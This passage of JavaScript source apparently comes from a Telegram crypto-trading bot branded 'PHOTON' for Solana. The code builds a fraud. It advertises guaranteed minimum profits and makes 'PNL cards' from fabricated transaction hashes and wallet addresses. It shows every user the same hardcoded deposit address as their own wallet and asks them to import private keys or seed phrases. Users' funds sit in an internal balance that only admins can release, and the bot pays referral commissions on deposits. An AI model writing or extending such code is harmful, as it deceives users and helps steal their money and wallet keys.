    
    const wallets = userWallets.get(chatId) || [];
    const mainBalance = getUserMainBalance(chatId);
    
    if (wallets.length === 0) {
        return sendTempMessage(chatId, '❌ You need to import a wallet first');
    }
    
    if (mainBalance <= 0) {
        return sendTempMessage(chatId, '❌ You have no balance to transfer');
    }
    
    const messageText = `
<b>💸 Transfer to Wallet</b>

💰 <b>Available Main Balance:</b> ${mainBalance.toFixed(4)} SOL

Select wallet to transfer to:
    `;
    
    const keyboard = wallets.map((wallet, index) => [{
        text: `${wallet.name || 'Wallet'} (${shortenAddress(wallet.publicKey)})`,
        callback_data: `transfer_select_${index}`
    }]);
    
    keyboard.push([{ text: '← Back', callback_data: 'wallet_menu' }]);
    
    const message = await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    
    const state = userStates.get(chatId) || {};
    state.transferMenuMessageId = message.message_id;
    userStates.set(chatId, state);
}

async function requestWithdrawal(chatId, walletIndex, amount) {
    console.log(`💸 Processing withdrawal for user ${chatId}, amount: ${amount} SOL`);
    
    const wallets = userWallets.get(chatId) || [];
    const wallet = wallets[walletIndex];
    
    if (!wallet) {
        return { success: false, message: '❌ Wallet not found' };
    }
    
    const mainBalance = getUserMainBalance(chatId);
    if (amount > mainBalance) {
        return { success: false, message: '❌ Insufficient main balance' };
    }
    
    const requestId = Date.now() + '_' + chatId;
    const withdrawalRequest = {
        id: requestId,
        userId: chatId,
        walletAddress: wallet.publicKey,
        amount: amount,
        status: 'pending',
        timestamp: Date.now(),
        username: userStates.get(chatId)?.username || `User_${chatId}`
    };
    
    withdrawalRequests.set(requestId, withdrawalRequest);
    savePersistentData();
    
    for (const adminId of ADMIN_IDS) {
        try {
            await safeSendMessage(adminId, 
                `<b>🔄 New Withdrawal Request</b>\n\n` +
                `• User: ${withdrawalRequest.username}\n` +
                `• User ID: ${chatId}\n` +
                `• Amount: ${amount.toFixed(4)} SOL\n` +
                `• Wallet: <code>${wallet.publicKey}</code>\n` +
                `• Request ID: ${requestId}\n\n` +
                `Approve or reject:`,
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Approve', callback_data: `admin_approve_withdrawal_${requestId}` },
                                { text: '❌ Reject', callback_data: `admin_reject_withdrawal_${requestId}` }
                            ]
                        ]
                    }
                }
            );
        } catch (error) {
            console.error('Error notifying admin:', error);
        }
    }
    
    return { 
        success: true, 
        message: `✅ Withdrawal request submitted for ${amount.toFixed(4)} SOL\n\n` +
                `⏳ Waiting for admin approval...\n` +
                `Request ID: ${requestId}`
    };
}

async function handleRenameWallet(chatId) {
    console.log(`✏️ Handling rename wallet for user ${chatId}`);
    
    const wallets = userWallets.get(chatId) || [];
    
    if (wallets.length === 0) {
        return sendTempMessage(chatId, '❌ No wallets to rename');
    }

    const keyboard = wallets.map((wallet, index) => [{
        text: `${wallet.name || 'Wallet'} (${shortenAddress(wallet.publicKey)})`,
        callback_data: `rename_select_${index}`
    }]);

    keyboard.push([{ text: '← Back', callback_data: 'wallet_menu' }]);

    await safeSendMessage(chatId, 'Select wallet to rename:', {
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
}

async function handleDeleteWallet(chatId) {
    console.log(`🗑️ Handling delete wallet for user ${chatId}`);
    
    const wallets = userWallets.get(chatId) || [];
    
    if (wallets.length === 0) {
        return sendTempMessage(chatId, '❌ No wallets to delete');
    }

    const keyboard = wallets.map((wallet, index) => [{
        text: `${wallet.name || 'Wallet'} (${shortenAddress(wallet.publicKey)})`,
        callback_data: `delete_select_${index}`
    }]);

    keyboard.push([{ text: '← Back', callback_data: 'wallet_menu' }]);

    await safeSendMessage(chatId, 'Select wallet to delete:', {
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
}

async function handleSetDefaultWallet(chatId) {
    console.log(`⭐ Handling set default wallet for user ${chatId}`);
    
    const wallets = userWallets.get(chatId) || [];
    
    if (wallets.length === 0) {
        return sendTempMessage(chatId, '❌ No wallets available');
    }

    const keyboard = wallets.map((wallet, index) => [{
        text: `${wallet.isDefault ? '✅ ' : ''}${wallet.name || 'Wallet'} (${shortenAddress(wallet.publicKey)})`,
        callback_data: `default_select_${index}`
    }]);

    keyboard.push([{ text: '← Back', callback_data: 'wallet_menu' }]);

    await safeSendMessage(chatId, 'Select default wallet:', {
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
}

// ==================== IMPORT WALLET ====================
async function showImportWalletMenu(chatId) {
    console.log(`🔑 Showing import wallet menu for user ${chatId}`);
    
    await cleanupPreviousMessages(chatId, true);
    
    await safeSendMessage(chatId, '<b>🔑 Import Wallet</b>', {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔑 Private Key', callback_data: 'import_private_key' },
                    { text: '🌱 Seed Phrase', callback_data: 'import_seed_phrase' }
                ],
                [
                    { text: '← Back', callback_data: 'wallet_menu' }
                ]
            ]
        }
    });
}

// ==================== AUTOTRADE FUNCTIONS AVEC LIMITES ====================
async function showAutotradeMenu(chatId) {
    console.log(`🤖 Showing autotrade menu for user ${chatId}`);
    
    await cleanupPreviousMessages(chatId, true);
    
    const sessionInfo = sessionLimiter.getSessionInfo(chatId);
    
    if (!sessionInfo.canStart) {
        const messageText = `
<b>🤖 AUTOTRADE - Session Limit Reached</b>

❌ <b>You have reached your daily session limit!</b>

📊 <b>Session Statistics:</b>
• Sessions used today: ${sessionInfo.dailySessions}/${sessionInfo.dailyLimit}
• Remaining sessions: 0

⏰ <b>Next session available:</b> Tomorrow at 00:00 UTC

📈 <b>Why the limit?</b>
To ensure fair usage and optimal market conditions for all users, we limit the number of autotrade sessions per day.

🔔 <b>We will notify you when you can start a new session!</b>
        `;
        
        await safeSendMessage(chatId, messageText, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📊 View History', callback_data: 'view_trade_history' },
                        { text: '💰 Check Balance', callback_data: 'wallet_menu' }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        });
        
        return;
    }

    const autotradeSession = autotradeSessions.get(chatId.toString());

    if (autotradeSession) {
        const state = userStates.get(chatId) || {};
        if (state.autotradeMessageId) {
            console.log(`🔄 Existing autotrade session found, updating UI`);
            return autotradeSession.sendAutotradeUpdate(chatId, state.autotradeMessageId);
        }
    }

    const mainBalance = getUserMainBalance(chatId);
    if (mainBalance < 1 && !autotradeSession) {
        console.log(`❌ User ${chatId} has insufficient balance for autotrade: ${mainBalance} SOL`);
        return sendTempMessage(chatId, '❌ You need at least 1 SOL in your main balance to use Autotrade');
    }

    const remainingSessions = sessionInfo.remainingSessions;
    
    const messageText = `
<b>🤖 AUTOTRADE Configuration</b>

💰 <b>Available Main Balance:</b> ${Number(mainBalance).toFixed(4)} SOL
📊 <b>Remaining sessions today:</b> ${remainingSessions}/${sessionInfo.dailyLimit}

<b>🎯 Select Trading Mode:</b>

<b>🟢 SAFE MODE</b>
• ${AUTOTRADE_MODES.SAFE.description}
• Risk: Very Low
• Stop Loss: 15%
• For conservative traders

<b>🟡 NORMAL MODE</b>
• ${AUTOTRADE_MODES.NORMAL.description}
• Risk: Moderate
• Stop Loss: 20%
• Balanced risk/reward

<b>🔴 DEGEN MODE</b>
• ${AUTOTRADE_MODES.DEGEN.description}
• Risk: High
• Stop Loss: 30%
• For maximum gains

💡 <b>All modes guarantee minimum profits!</b>

👇 <b>Select your mode:</b>
    `;

    const message = await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: `🟢 SAFE (+${((AUTOTRADE_MODES.SAFE.guaranteedProfit-1)*100).toFixed(0)}%)`, callback_data: 'autotrade_mode_safe' },
                    { text: `🟡 NORMAL (+${((AUTOTRADE_MODES.NORMAL.guaranteedProfit-1)*100).toFixed(0)}%)`, callback_data: 'autotrade_mode_normal' }
                ],
                [
                    { text: `🔴 DEGEN (+${((AUTOTRADE_MODES.DEGEN.guaranteedProfit-1)*100).toFixed(0)}%)`, callback_data: 'autotrade_mode_degen' }
                ],
                [
                    { text: '📊 Session Info', callback_data: 'session_info' }
                ],
                [
                    { text: '🏠 Main Menu', callback_data: 'menu' }
                ]
            ]
        }
    });
    
    const state = userStates.get(chatId) || {};
    state.autotradeMenuMessageId = message.message_id;
    userStates.set(chatId, state);
}

async function startAutotradeSession(chatId, mode, amount) {
    console.log(`🚀 Starting autotrade session for user ${chatId}, mode: ${mode}, amount: ${amount}`);
    
    if (!sessionLimiter.canStartSession(chatId)) {
        return sendTempMessage(chatId, '❌ You have reached your daily session limit. Try again tomorrow.');
    }
    
    if (amount > getUserMainBalance(chatId)) {
        return sendTempMessage(chatId, `❌ Insufficient balance. You have ${getUserMainBalance(chatId).toFixed(4)} SOL`);
    }

    // Compter la session
    const sessionCount = sessionLimiter.startSession(chatId);
    
    setUserMainBalance(chatId, getUserMainBalance(chatId) - amount);

    const session = new AutotradeSession(chatId, mode, amount);
    autotradeSessions.set(chatId.toString(), session);
    savePersistentData();

    await session.start();

    const message = await safeSendMessage(chatId, '🔄 Starting autotrade session...', {
        parse_mode: 'HTML'
    });
    
    const state = userStates.get(chatId) || {};
    state.autotradeMessageId = message.message_id;
    userStates.set(chatId, state);

    await session.sendAutotradeUpdate(chatId, message.message_id);
}

async function stopAutotradeSession(chatId) {
    console.log(`🛑 Stopping autotrade session for user ${chatId}`);
    
    const session = autotradeSessions.get(chatId.toString());
    
    if (!session) {
        console.log(`❌ No active autotrade session found for user ${chatId}`);
        return sendTempMessage(chatId, '❌ No active autotrade session');
    }

    console.log(`Stopping autotrade session for user ${chatId}`);
    
    const result = await session.stop();
    
    autotradeSessions.delete(chatId.toString());
    savePersistentData();
    
    console.log(`✅ Autotrade session stopped successfully for user ${chatId}`);
    
    return true;
}

async function viewTradeHistory(chatId) {
    console.log(`📊 Viewing trade history for user ${chatId}`);
    
    let history = tradeHistory.get(chatId.toString()) || [];
    
    // Si PostgreSQL est disponible, récupérer l'historique
    if (pgClient) {
        try {
            const result = await pgClient.query(
                `SELECT * FROM autotrade_sessions WHERE user_id = $1 ORDER BY created_at DESC LIMIT 10`,
                [chatId]
            );
            if (result.rows.length > 0) {
                history = result.rows.map(row => ({
                    mode: row.mode,
                    initialAmount: parseFloat(row.initial_amount),
                    finalAmount: parseFloat(row.final_amount),
                    profit: parseFloat(row.profit),
                    profitPercentage: (parseFloat(row.profit) / parseFloat(row.initial_amount)) * 100,
                    trades: row.trades_count,
                    winRate: parseFloat(row.win_rate),
                    duration: row.duration * 1000,
                    timestamp: new Date(row.created_at).getTime()
                }));
            }
        } catch (error) {
            console.error('Error fetching from database:', error);
        }
    }
    
    if (history.length === 0) {
        return sendTempMessage(chatId, '📭 No trade history available');
    }
    
    let message = `<b>📊 Trade History (Last ${history.length} sessions)</b>\n\n`;
    
    history.reverse().forEach((session, index) => {
        const date = new Date(session.timestamp).toLocaleDateString();
        message += `<b>Session ${index + 1} - ${session.mode} Mode</b>\n`;
        message += `• Date: ${date}\n`;
        message += `• Initial: ${session.initialAmount.toFixed(4)} SOL\n`;
        message += `• Final: ${session.finalAmount.toFixed(4)} SOL\n`;
        message += `• Profit: <b>${session.profit >= 0 ? '🟢 +' : '🔴 '}${Math.abs(session.profit).toFixed(4)} SOL</b>\n`;
        message += `• Return: ${session.profitPercentage.toFixed(2)}%\n`;
        message += `• Trades: ${session.trades}\n`;
        message += `• Win Rate: ${session.winRate.toFixed(1)}%\n`;
        message += `• Duration: ${formatTime(Math.floor(session.duration / 1000))}\n`;
        
        message += `\n`;
    });
    
    await safeSendMessage(chatId, message, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '📈 View Best Trades', callback_data: 'view_best_trades' }
                ],
                [
                    { text: '🏠 Main Menu', callback_data: 'menu' }
                ]
            ]
        }
    });
}

async function viewBestTrades(chatId) {
    console.log(`🏆 Viewing best trades for user ${chatId}`);
    
    const userBestTrades = bestTrades.get(chatId.toString()) || [];
    
    if (userBestTrades.length === 0) {
        return sendTempMessage(chatId, '📭 No best trades recorded yet');
    }
    
    let message = `<b>🏆 Your Best Trades</b>\n\n`;
    
    userBestTrades.slice(0, 5).forEach((trade, index) => {
        const date = new Date(trade.timestamp).toLocaleDateString();
        message += `<b>#${index + 1} - ${trade.token}</b>\n`;
        message += `• Date: ${date}\n`;
        message += `• Mode: ${trade.mode || 'N/A'}\n`;
        message += `• Profit: <b>🟢 +${trade.profit.toFixed(4)} SOL</b>\n`;
        message += `• PNL: ${trade.pnl.toFixed(2)}%\n`;
        message += `• Buy: ${trade.buyPrice.toFixed(8)} SOL\n`;
        message += `• Sell: ${trade.sellPrice.toFixed(8)} SOL\n`;
        message += `• Duration: ${formatTime(Math.floor(trade.duration / 1000))}\n\n`;
    });
    
    await safeSendMessage(chatId, message, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔄 Generate PNL Card', callback_data: 'generate_pnl_card' }
                ],
                [
                    { text: '📊 Back to History', callback_data: 'view_trade_history' }
                ]
            ]
        }
    });
}

async function generatePNLCard(chatId) {
    console.log(`🎨 Generating PNL card for user ${chatId}`);
    
    const userBestTrades = bestTrades.get(chatId.toString()) || [];
    
    if (userBestTrades.length === 0) {
        return sendTempMessage(chatId, '❌ No best trades available to generate PNL card');
    }
    
    const bestTrade = userBestTrades[0];
    
    // Limiter le PNL à un maximum réaliste
    const realisticPNL = Math.min(bestTrade.pnl, 150);
    
    const pnlData = {
        token: bestTrade.token,
        buyPrice: bestTrade.buyPrice.toFixed(6),
        sellPrice: (bestTrade.buyPrice * (1 + realisticPNL / 100)).toFixed(6),
        pnl: realisticPNL.toFixed(2),
        txHash: generateSolanaTxHash(),
        wallet: generateUniqueSolanaWallet(),
        link: `https://t.me/PhotonTradingBot`
    };
    
    try {
        const imgPath = await generatePNLImage(pnlData);
        if (!imgPath) {
            return sendTempMessage(chatId, '❌ Error generating PNL card');
        }
        
        await mainBot.sendPhoto(chatId, imgPath, {
            caption: `🏆 Your Best Trade PNL Card\n\n` +
                    `Token: ${bestTrade.token}\n` +
                    `Profit: +${bestTrade.profit.toFixed(4)} SOL\n` +
                    `PNL: ${realisticPNL.toFixed(2)}%\n\n` +
                    `Share this amazing result!`,
            parse_mode: 'HTML'
        });
        
        // Supprimer l'image temporaire
        fs.unlinkSync(imgPath);
        
    } catch (error) {
        console.error('Error sending PNL card:', error);
        sendTempMessage(chatId, '❌ Error generating PNL card');
    }
}

// ==================== REFERRAL MENU ====================
async function showReferralMenu(chatId) {
    console.log(`🎁 Showing referral menu for user ${chatId}`);
    
    await cleanupPreviousMessages(chatId, true);
    
    const referralCode = referralSystem.generateCode(chatId);
    const referralCount = referralSystem.getUserReferrals(chatId);
    const validReferralCount = referralSystem.getUserValidReferrals(chatId);
    const bonusAmount = referralSystem.getUserBonus(chatId);
    const userLevel = referralSystem.getUserLevel(chatId);
    const canWithdraw = referralSystem.canWithdrawBonus(chatId);

    const messageText = `
<b>👥 PROGRAMME DE PARRAINAGE 💰</b>

📊 <b>VOS STATISTIQUES :</b>
• 💰 Gains parrainage : ${Number(bonusAmount).toFixed(4)} SOL
• 👥 Parrainages directs : ${referralCount}
• ✅ Parrainages valides : ${validReferralCount}/3
• 🔑 Votre code de parrainage : <code>${referralCode}</code>
• 🏆 Niveau : ${userLevel}

🔗 <b>LIEN DE PARRAINAGE :</b>
https://t.me/PhotonTradingBot?start=${referralCode}

💰 <b>COMMISSIONS :</b>
• Niveau 1 (Direct) : 10% des dépôts du filleul

🎯 <b>CONDITIONS DE PARRAINAGE VALIDE :</b>
• Le filleul doit faire un dépôt via l'admin
• Seuls les dépôts réels comptent pour les 3 parrainages requis
• Les parrainages essai gratuit ne comptent PAS

✨ <b>AVANTAGES :</b>
• 🎁 Revenu passif supplémentaire
• 🏆 Niveaux avec récompenses
• 📊 Tableau de bord détaillé
• ✅ Compte pour les conditions de retrait du plan gratuit
    `;

    const keyboard = [
        [{ text: "📤 Share", switch_inline_query: `Join Photon Trading Bot with my code: ${referralCode}` }]
    ];

    if (canWithdraw && bonusAmount > 0) {
        keyboard.unshift([{ text: "💰 Withdraw Bonus", callback_data: 'withdraw_bonus' }]);
    }

    keyboard.push([{ text: "🏠 Main Menu", callback_data: 'menu' }]);

    const message = await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    
    const state = userStates.get(chatId) || {};
    state.referralMenuMessageId = message.message_id;
    userStates.set(chatId, state);
}

// ==================== HELP MENU ====================
async function showHelpMenu(chatId) {
    console.log(`❓ Showing help menu for user ${chatId}`);
    
    await cleanupPreviousMessages(chatId, true);
    
    const messageText = `
<b>PHOTON Help Center</b>

🔹 <b>How do I use PHOTON?</b>
Join our support chat for additional resources on our channel @PhotonSupport

🔹 <b>Where can I find my referral code?</b>
Open the /start menu and click 💰Referrals.

🔹 <b>What are the fees for using PHOTON?</b>
Successful transactions through PHOTON incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.

🔹 <b>Security Tips: How can I protect my account from scammers?</b>
- PHOTON does NOT require you to login with a phone number or QR code! 
- NEVER search for bots in telegram. Use only official links.
- Admins and Mods NEVER dm first or send links, stay safe!

🔹 <b>Trading Tips: Common Failure Reasons</b>
- Slippage Exceeded: Up your slippage or sell in smaller increments.
- Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.
- Timed out: Can occur with heavy network loads, consider increasing your gas tip.

🔹 <b>Additional questions or need support?</b>
Join our Telegram channel @PhotonSupport and one of our admins can assist you.

${new Date().toLocaleTimeString('fr-FR', {hour: '2-digit', minute:'2-digit'})}
    `;

    const message = await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: {
            inline_keyboard: [
                [{ text: "📢 Official Channel", url: "https://t.me/PhotonResults" }],
                [{ text: "💬 Support Chat", url: "https://t.me/PhotonSupport" }],
                [{ text: "🏠 Main Menu", callback_data: 'menu' }]
            ]
        }
    });

    const state = userStates.get(chatId) || {};
    state.helpMenuMessageId = message.message_id;
    userStates.set(chatId, state);
}

// ==================== BUY/SELL MENU ====================
async function showBuySellMenu(chatId) {
    console.log(`📊 Showing buy/sell menu for user ${chatId}`);
    
    const sentMessage = await safeSendMessage(chatId, '📊 Loading portfolio...');
    
    if (sentMessage) {
        if (!tradingState.trackedMessages.has(chatId)) {
            tradingState.trackedMessages.set(chatId, new Set());
        }
        tradingState.trackedMessages.get(chatId).add(sentMessage.message_id);
        
        await updatePortfolioMessage(chatId, sentMessage.message_id);
    }
}

async function updatePortfolioMessage(chatId, messageId) {
    try {
        const user = initializeTradingUser(chatId);
        const pnl = calculateUserPNL(user);
        
        const messageParts = [];
        messageParts.push(`<b>💎 Trading Portfolio 💎</b>\n\n`);
        messageParts.push(`💰 <b>Available SOL:</b> ${user.wallet.SOL.toFixed(4)}\n`);
        messageParts.push(`📊 <b>Total PNL:</b> ${formatPNL(pnl.total)} (Realized: ${formatPNL(pnl.realized)}, Unrealized: ${formatPNL(pnl.unrealized)})\n`);
        messageParts.push(`⛽ <b>Total gas fees:</b> ${user.stats.totalGasFees.toFixed(6)} SOL\n\n`);
        
        messageParts.push(`<b>📈 Open positions:</b>\n`);
        const tokens = Object.keys(user.wallet.tokens);
        
        if (tokens.length === 0) {
            messageParts.push(`\nNo open positions\n`);
        } else {
            for (const token of tokens) {
                try {
                    const data = user.wallet.tokens[token];
                    const currentPrice = updateTokenPrice(token);
                    const tokenPNL = (data.amount * currentPrice) - (data.amount * data.buyPrice);
                    
                    messageParts.push(`\n▸ <b>${getTokenName(token)}</b> (<code>${shortenAddress(token)}</code>)\n`);
                    messageParts.push(`   ▪ Quantity: ${data.amount.toFixed(2)}\n`);
                    messageParts.push(`   ▪ Avg price: ${data.buyPrice.toFixed(8)} SOL\n`);
                    messageParts.push(`   ▪ Current price: ${currentPrice.toFixed(8)} SOL\n`);
                    messageParts.push(`   ▪ Value: ${(data.amount * currentPrice).toFixed(4)} SOL\n`);
                    messageParts.push(`   ▪ PNL: ${formatPNL(tokenPNL)}\n`);
                } catch (error) {
                    console.error(`Token display error ${token}:`, error);
                    messageParts.push(`\n▸ <code>${shortenAddress(token)}</code> (display error)\n`);
                }
            }
        }

        messageParts.push(`\n<b>⏳ Recent transactions:</b>\n`);
        const recentTransactions = user.wallet.history.slice(-3).reverse();
        
        if (recentTransactions.length === 0) {
            messageParts.push(`\nNo recent transactions\n`);
        } else {
            for (const tx of recentTransactions) {
                try {
                    const pnl = (tx.amount * tx.price) - (tx.amount * tx.buyPrice);
                    messageParts.push(`\n▸ ${tx.type === 'buy' ? '🛒 Buy' : '💰 Sell'} ${tx.amount.toFixed(2)} ${getTokenName(tx.token)}\n`);
                    messageParts.push(`   ▪ Price: ${tx.price.toFixed(8)} SOL\n`);
                    messageParts.push(`   ▪ Fees: ${user.settings.gasFee.toFixed(6)} SOL\n`);
                    messageParts.push(`   ▪ PNL: ${formatPNL(pnl)}\n`);
                    messageParts.push(`   ▪ Date: ${new Date(tx.date).toLocaleTimeString()}\n`);
                } catch (error) {
                    console.error('Transaction display error:', error);
                }
            }
        }

        messageParts.push(`\n🔄 <i>Update: ${new Date().toLocaleTimeString()}</i>`);

        const fullMessage = messageParts.join('');
        
        const success = await safeEditMessage(
            chatId,
            messageId,
            fullMessage,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "🔄 Refresh", callback_data: "refresh_portfolio" },
                            { text: "📊 Stats", callback_data: "show_stats" }
                        ],
                        [
                            { text: "🛒 Buy", callback_data: "show_buy" },
                            { text: "💰 Sell", callback_data: "show_sell" }
                        ],
                        [
                            { text: "⚙️ Settings", callback_data: "show_settings" }
                        ],
                        [
                            { text: "🏠 Main Menu", callback_data: "menu" }
                        ]
                    ]
                }
            }
        );

        if (!success) {
            console.log('Failed to update message');
        }

    } catch (error) {
        console.error('Critical error in portfolio update:', error);
    }
}

// ==================== STATS MENU ====================
async function showStats(chatId) {
    console.log(`📊 Showing stats for user ${chatId}`);
    
    try {
        const user = initializeTradingUser(chatId);
        const pnl = calculateUserPNL(user);
        
        let statsMessage = `<b>📊 Trading Statistics</b>\n\n`;
        statsMessage += `▸ Total trades: ${user.stats.totalTrades}\n`;
        statsMessage += `▸ Win rate: ${user.stats.winRate.toFixed(2)}%\n`;
        statsMessage += `▸ Total profit: ${formatPNL(user.stats.totalProfit)}\n`;
        statsMessage += `▸ Total loss: ${formatPNL(-user.stats.totalLoss)}\n`;
        statsMessage += `▸ Total gas fees: ${user.stats.totalGasFees.toFixed(6)} SOL\n`;
        statsMessage += `▸ Total PNL: ${formatPNL(pnl.total)}\n\n`;
        statsMessage += `▸ Realized PNL: ${formatPNL(pnl.realized)}\n`;
        statsMessage += `▸ Unrealized PNL: ${formatPNL(pnl.unrealized)}\n\n`;
        statsMessage += `Last update: ${new Date().toLocaleTimeString()}`;
        
        await safeSendMessage(
            chatId,
            statsMessage,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "📤 Share my stats", callback_data: "share_stats" },
                            { text: "🔙 Back", callback_data: "back_to_portfolio" }
                        ]
                    ]
                }
            }
        );
    } catch (error) {
        console.error('Stats display error:', error);
    }
}

// ==================== ACCÈS APRÈS CODE DE PARRAINAGE ====================
async function showAccessGranted(chatId) {
    console.log(`🎉 Showing access granted for user ${chatId}`);
    
    await cleanupPreviousMessages(chatId);
    
    const messageText = `
<b>🎉 Congratulations! Your access code has been successfully approved! 🎉</b>

👋 <b>Welcome to PHOTON</b>, the complete Trading Platform for Beginners.
Effortlessly check,demo trade any token on Solana with complete control at your fingertips and receive smart AI calls .

🟢 <b>Access Granted: PHOTON</b>

📌 Don't forget to join our Support Channel and explore the guide below for a smooth start:

🔗 Join Support
📘 Guide
▶️ YouTube

👇 <b>Ready to begin? Press Continue below to start using PHOTON 🚀</b>
    `;

    const message = await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: '➡️ Continue', callback_data: 'continue' }]
            ]
        }
    });
    
    const state = userStates.get(chatId) || {};
    state.accessGrantedMessageId = message.message_id;
    userStates.set(chatId, state);
}

// ==================== MAIN MENUS ====================
async function showMainMenu(chatId) {
    console.log(`🏠 Showing main menu for user ${chatId}`);
    
    await cleanupPreviousMessages(chatId);
    
    const messageText = `
<b>🚀 Welcome to PHOTON</b>

🤖 The fastest Telegram Bot on <b>Solana</b>.

🔍 It allows you to:
• 🛡️ Check if a coin is a <b>rug</b>
• 🧪 Make <b>demo trading</b> under real conditions
• ⚡ Use the powerful <b>autotrade</b> function

🛠️ Features: <b>demo trade</b>, <b>call IA</b>, <b>rugcheck</b>

🔐 <b>Have an access code?</b>
Enter it below to unlock <b>instant access</b>.

🙋 <b>No access code?</b>
👇 Tap the button below to <b>join the queue</b> and be the first to experience <b>PHOTON</b>.

🎯 <b>Let's get started!</b>
    `;

    const message = await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: '🎟️ Join Queue', callback_data: 'join_queue' }],
                [{ text: '🔑 Enter Access Code', callback_data: 'enter_code' }]
            ]
        }
    });
    
    const state = userStates.get(chatId) || {};
    state.mainMenuMessageId = message.message_id;
    userStates.set(chatId, state);
}

async function showTradingMenu(chatId) {
    console.log(`🔫 Showing trading menu for user ${chatId}`);
    
    await cleanupPreviousMessages(chatId, true);
    
    const wallets = userWallets.get(chatId) || [];
    const defaultWallet = wallets.find(w => w.isDefault) || wallets[0];
    const walletBalance = defaultWallet?.publicKey ? await getWalletBalance(defaultWallet.publicKey) : 0;
    const mainBalance = getUserMainBalance(chatId);
    const demoBalance = tradingState.users[chatId]?.wallet?.SOL || TRADING_CONFIG.INITIAL_SOL_BALANCE;
    const referralBonus = referralSystem.getUserBonus(chatId);
    const autotradeSession = autotradeSessions.get(chatId.toString());
    const sessionInfo = sessionLimiter.getSessionInfo(chatId);

    const canAutotrade = mainBalance >= 1 || autotradeSession;
    const hasUsedReferral = referralSystem.hasUsedReferralCode(chatId);
    
    const totalBalance = walletBalance + mainBalance + referralBonus;

    const messageText = `
<b>🔫 Welcome to PHOTON Telegram Bot!</b>

🚀 <b>The fastest all-in-one trading platform.</b>

💡 Specifically designed for memecoin traders, this bot is an essential tool: ultra-fast execution, automatic trade copying, real-time transaction tracking — all while keeping your wallet and settings synchronized across all platforms.

Join our Telegram channel @photonv2_results and check our platform
https://photon-sol.tinyastro.io/en/discover

🔥 <b>Live Results:</b> <a href="https://t.me/pnl_Results">https://t.me/pnl_Results</a>

📋 <b>YOUR SOLANA WALLET</b>
<code>9nczSEPzNTKShbRHWeM6gFgn9XR1GMozQ8zrxTYrWTag</code>
<i>(Click to copy)</i>

<b>💰 YOUR BALANCES</b>
🔹 <b>Wallet Balance:</b> ${Number(walletBalance).toFixed(4)} SOL
🔹 <b>Main Balance:</b> ${Number(mainBalance).toFixed(4)} SOL
🔹 <b>Demo Balance:</b> ${Number(demoBalance).toFixed(4)} SOL
🔹 <b>Referral Bonus:</b> ${Number(referralBonus).toFixed(4)} SOL
━━━━━━━━━━━━━━━━━━━━
<b>💎 TOTAL BALANCE:</b> ${Number(totalBalance).toFixed(4)} SOL

${hasUsedReferral ? '🎉 <b>Referral code activated!</b> You can now use all features.\n\n' : ''}
${autotradeSession ? `<b>🤖 AUTOTRADE ACTIVE - ${autotradeSession.mode} MODE</b>\n` : ''}
${sessionInfo.canStart ? `📊 <b>Sessions today:</b> ${sessionInfo.dailySessions}/${sessionInfo.dailyLimit}` : '❌ <b>Session limit reached for today</b>'}

<b>🟢 How to Get Started – It's Easy!</b>

1️⃣ Deposit <b>SOL</b> into your Solana wallet
2️⃣ Start <b>AUTOTRADE FUNCTION</b> and setup it
3️⃣ Enjoy profits

⚠️ Please note: We have no control over the ads shown by Telegram within this bot. Beware of fake airdrops or login pages—do not fall for scams.
    `;

    const autotradeButton = canAutotrade && sessionInfo.canStart
        ? { text: autotradeSession ? '🤖 AUTOTRADE ACTIVE' : '🚀 AUTOTRADE', callback_data: 'autotrade_menu' }
        : { text: '🚀 AUTOTRADE', callback_data: 'autotrade_denied' };

    const keyboard = [
        [autotradeButton],
        [  
            { text: '📢 Live Results', url: 'https://t.me/pnl_Results' },
            { text: '🛒 DEMOTRADE', callback_data: 'buy_sell' }
        ],
        [
            { text: '📊 Positions', callback_data: 'positions' },
            { text: '🔍 Rug Check', callback_data: 'rug_check' }
        ],
        [
            { text: '🤖 Call AI', callback_data: 'call_ai' },
            { text: '👛 Wallet', callback_data: 'wallet_menu' }
        ],
        [
            { text: '📈 Referral', callback_data: 'referral' },
            { text: '🔄 Refresh', callback_data: 'refresh' }
        ],
        [
            { text: '❓ Help', callback_data: 'help' }
        ]
    ];

    if (ADMIN_IDS.includes(chatId)) {
        keyboard.push([{ text: '👑 Admin Panel', callback_data: 'admin_menu' }]);
    }

    const message = await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    
    const state = userStates.get(chatId) || {};
    state.tradingMenuMessageId = message.message_id;
    userStates.set(chatId, state);
}

// ==================== ADMIN FUNCTIONS ====================
async function showAdminMenu(chatId) {
    console.log(`👑 Showing admin menu for user ${chatId}`);
    
    if (!ADMIN_IDS.includes(chatId)) {
        return sendTempMessage(chatId, '❌ Access denied');
    }

    await cleanupPreviousMessages(chatId, true);
    
    const totalUsers = connectedUsers.size;
